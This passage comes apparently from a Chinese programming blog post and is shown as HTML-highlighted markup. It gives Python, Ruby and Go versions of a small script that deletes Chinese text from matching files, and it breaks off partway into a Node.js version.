    &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;#传递命令行参数 filetype&lt;/span&gt;
    &lt;span class="n"&gt;filter_filename_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filter_filetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filter_filename_list&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;以上代码保存在clean_zh.py中&lt;/p&gt;
&lt;p&gt;使用：&lt;code&gt;python3 clean_zh.py PATH txt&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;使用python3运行，python2对unicode的支持不好&lt;/p&gt;
&lt;p&gt;函数写的很不纯，之后重构一下&lt;/p&gt;
&lt;p&gt;关于Python字符串的搜索和替换可以参考&lt;a href="http://python3-cookbook.readthedocs.org/zh_CN/latest/c02/p05_search_and_replace_text.html"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;p&gt;发现这是个很棒的Code Kata（通过实际的编程练习来提升敏捷开发的技能）&lt;br /&gt;
于是决定写下其他语言的实现版本作为练习&lt;/p&gt;
&lt;p&gt;涉及的知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;正则表达式&lt;/li&gt;
&lt;li&gt;字符串(unicode)&lt;/li&gt;
&lt;li&gt;文件和目录&lt;/li&gt;
&lt;li&gt;函数(参数)&lt;/li&gt;
&lt;li&gt;命令行参数&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ruby&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span class="c1"&gt;#encoding=UTF-8&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;filter_filetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;downcase&lt;/span&gt;
  &lt;span class="n"&gt;filenames&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Dir&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;entries&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;filter_filename_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filenames&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;end_with?filetype&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;filter_filename_list&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;zh_to_endline&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/[\u4e00-\u9fa5].*/&lt;/span&gt; &lt;span class="c1"&gt;#匹配从中文开始到行尾&lt;/span&gt;
  &lt;span class="c1"&gt;#clean_content = str.sub(zh_to_endline, &amp;quot;&amp;quot;)&lt;/span&gt;
  &lt;span class="n"&gt;filename_split&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;output_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_output.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
  &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="c1"&gt;#file.each_line{|line| puts line.sub(zh_to_endline,&amp;quot;&amp;quot;)}&lt;/span&gt;
    &lt;span class="n"&gt;contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="c1"&gt;#clean_content = contents.sub(zh_to_endline,&amp;quot;&amp;quot;)&lt;/span&gt;
    &lt;span class="n"&gt;clean_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;contents&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gsub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;zh_to_endline&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;output_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output_filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;output_filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clean_content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;output_filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="c1"&gt;#puts clean_content&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;__FILE__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="vg"&gt;$0&lt;/span&gt;
  &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
  &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
  &lt;span class="n"&gt;filter_filename_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filter_filetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;filter_filename_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用 &lt;code&gt;ruby clean_zh.rb PATH txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Ruby写起来似乎比Python还惬意~&lt;/p&gt;
&lt;h3&gt;Golang&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;package&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;io/ioutil&amp;quot;&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;os&amp;quot;&lt;/span&gt;
        &lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;path&amp;quot;&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;path/filepath&amp;quot;&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;regexp&amp;quot;&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;strings&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;func&lt;/span&gt; &lt;span class="n"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;pattern&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;(?i)[&lt;/span&gt;&lt;span class="se"&gt;\u4e00&lt;/span&gt;&lt;span class="s2"&gt;-&lt;/span&gt;&lt;span class="se"&gt;\u9fa5&lt;/span&gt;&lt;span class="s2"&gt;].*&amp;quot;&lt;/span&gt;
        &lt;span class="n"&gt;pattern&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;(?i)[&lt;/span&gt;&lt;span class="se"&gt;\u4e00&lt;/span&gt;&lt;span class="s2"&gt;-&lt;/span&gt;&lt;span class="se"&gt;\u9fa5&lt;/span&gt;&lt;span class="s2"&gt;].*&amp;quot;&lt;/span&gt;
        &lt;span class="n"&gt;reg&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;regexp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MustCompile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pattern&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;contents&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ioutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;clean_content&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;reg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReplaceAllString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;contents&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;contents&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;contents&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;filename_split&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;output_filename&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_output.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output_filename&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="n"&gt;ioutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output_filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clean_content&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mo"&gt;0644&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;func&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;getpath&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getpath&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="n"&gt;contains&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="nb"&gt;all&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;
        &lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="err"&gt;是索引，&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="err"&gt;是值&lt;/span&gt;
                &lt;span class="n"&gt;filename_split&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="n"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用 &lt;code&gt;go run clean_zh.go PATH txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Golang的语法糖好少！想使用Slices来收集过滤完的filename&lt;/p&gt;
&lt;h3&gt;Nodejs&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;//use =G to formet js with javascript.vim&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;is_filetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;element&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;element&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// 使用全局变量？之后使用闭包替换吧&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;filename_split&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
